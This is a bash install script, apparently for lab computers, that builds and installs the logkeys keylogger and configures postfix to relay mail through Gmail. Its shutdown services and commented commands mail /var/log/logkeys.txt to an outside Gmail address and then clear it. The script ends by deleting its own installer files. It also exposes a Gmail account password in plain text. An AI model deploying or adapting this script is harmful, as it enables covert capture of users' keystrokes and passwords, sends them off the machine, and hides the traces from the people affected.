#!/bin/bash
if [ -z "$1" ]
  then
    echo "MISSING ARGUMENT"
    exit 1
fi

set -e

proxyFile="/etc/apt/apt.conf.d/01proxy"
if [ -f "$proxyFile" ]
then
   sudo cp /etc/apt/apt.conf.d/01proxy proxy
   sudo cp blank /etc/apt/apt.conf.d/01proxy
   echo "$file found."
else
   echo "$proxyFile not found."
fi

#sudo apt-get install logkeys
# -------- INSTALL LOGKEYS MANUAL ------
sudo apt-get update
sudo apt-get -y install autotools-dev autoconf

cd logkeys-master
pwd
chmod +x autogen.sh
sudo ./autogen.sh     # generate files for build
cd build         # keeps the root and src dirs clean
sudo ../configure
sudo make
sudo make install
cd ..
cd ..
# -------------------------------

sudo cp keymaps/ /etc/ -R
sudo chmod 755 /etc/keymaps/ -R
sudo debconf-set-selections <<< "postfix postfix/mailname string your.hostname.com"
sudo debconf-set-selections <<< "postfix postfix/main_mailer_type string 'Internet Site'"
sudo apt-get -y install postfix mailutils libsasl2-2 ca-certificates libsasl2-modules

sudo cp rc-local.service /etc/systemd/system/rc-local.service
sudo cp rc.local /etc/rc.local
sudo chmod +x /etc/rc.local

#http://unix.stackexchange.com/questions/284598/systemd-how-to-execute-script-at-shutdown-only-not-at-reboot


#LINUX 16----------------------------------------------------------------------------------:
sudo cp shutdown_screen.service /etc/systemd/system/shutdown_screen.service
sudo cp shutdown_screen /etc/
sudo chmod 755 /etc/systemd/system/shutdown_screen.service
sudo systemctl daemon-reload
sudo systemctl enable shutdown_screen.service --now
sudo systemctl enable rc-local --now
sudo systemctl start rc-local.service
#-------------------------------------------------------------------------------------------
#LINUX 14:
#sed -i -- 's/relayhost=/hola\nhola2\nhola3\nhola4/g' prueba.replace 
#sudo vi /etc/rc0.d/K10unattended-upgrades 
#	sudo logkeys -k
#	echo $(date) |sudo  mail -s  "$(hostname) is $(date)" -A  /var/log/logkeys.txt Laboratorio.epistest@gmail.com
#	sleep 5
#	sudo echo "" > /var/log/logkeys.txt
#-------------------------------------------------------------------------------------------
sudo sed -i -- 's/relayhost =/relayhost = [smtp.gmail.com]:587\nsmtp_sasl_auth_enable = yes\nsmtp_sasl_password_maps = hash:\/etc\/postfix\/sasl_passwd\nsmtp_sasl_security_options = noanonymous\nsmtp_tls_CAfile = \/etc\/postfix\/cacert.pem\nsmtp_use_tls = yes/g' /etc/postfix/main.cf

#sudo vim /etc/postfix/main.cf    -> delete line en blanco reply
#	relayhost = [smtp.gmail.com]:587
#	smtp_sasl_auth_enable = yes
#	smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
#	smtp_sasl_security_options = noanonymous
#	smtp_tls_CAfile = /etc/postfix/cacert.pem
#	smtp_use_tls = yes

sudo cp sasl_passwd /etc/postfix/sasl_passwd
sudo sed -i -- 's/#number/'$1'/g' /etc/postfix/sasl_passwd
#sudo vi /etc/postfix/sasl_passwd
#	[smtp.gmail.com]:587    Laboratorio.epistest2@gmail.com:Buscouna123
sudo chmod 400 /etc/postfix/sasl_passwd
sudo postmap /etc/postfix/sasl_passwd
cat /etc/ssl/certs/thawte_Primary_Root_CA.pem | sudo tee -a /etc/postfix/cacert.pem
sudo /etc/init.d/postfix reload
sudo cp proxy /etc/apt/apt.conf.d/01proxy


sudo rm rc.local
sudo rm sasl_passwd
sudo rm script.sh
sudo rm shutdown_screen
sudo rm shutdown_screen.service
sudo rm keymaps -R
sudo rm proxy
sudo rm blank
sudo rm logkeys-master -R
sudo rm rc-local.service
#sudo rm administrador.tar.gz
sudo rm laboratorio.zip

